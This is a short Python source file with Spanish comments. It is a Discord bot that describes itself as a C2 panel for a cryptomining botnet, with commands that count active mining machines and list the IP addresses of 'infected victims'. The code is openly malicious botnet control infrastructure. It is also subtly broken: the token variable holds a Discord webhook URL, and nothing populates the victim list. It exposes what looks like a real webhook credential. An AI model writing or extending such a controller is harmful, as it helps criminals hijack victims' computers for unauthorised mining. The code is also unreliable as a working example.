import discord
from discord.ext import commands
import datetime

# Configuración
TOKEN = "https://discord.com/api/webhooks/1484319400675770612/fOLBkS0Isms6wGPNfGujQ6ZSfpnvyOHWWd0lYu6LNUciK4bhxLMJyuUAAatq-ZdPtHpb"
intentos = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intentos)

# Diccionario para rastrear bots activos {IP: última_vez_visto}
botnet_viva = {}

@bot.event
async def on_ready():
    print(f"\033[1;32m[+] Panel C2 en línea como {bot.user}\033[0m")

@bot.command()
async def status(ctx):
    """Muestra cuántas máquinas están minando ahora mismo"""
    count = len(botnet_viva)
    embed = discord.Embed(title="📊 Estado de la Red Enjambre", color=0x00ff00)
    embed.add_field(name="Bots Activos", value=f"**{count}** máquinas", inline=False)
    embed.set_footer(text=f"Última actualización: {datetime.datetime.now()}")
    await ctx.send(embed=embed)

@bot.command()
async def list(ctx):
    """Lista las IPs de las víctimas infectadas"""
    if not botnet_viva:
        await ctx.send("❌ No hay bots activos aún.")
        return
    
    lista = "\n".join([f"🌐 {ip} - Activo" for ip in botnet_viva.keys()])
    await ctx.send(f"**Nodos de Minería:**\n```{lista}```")

# Iniciamos el bot
bot.run(TOKEN)
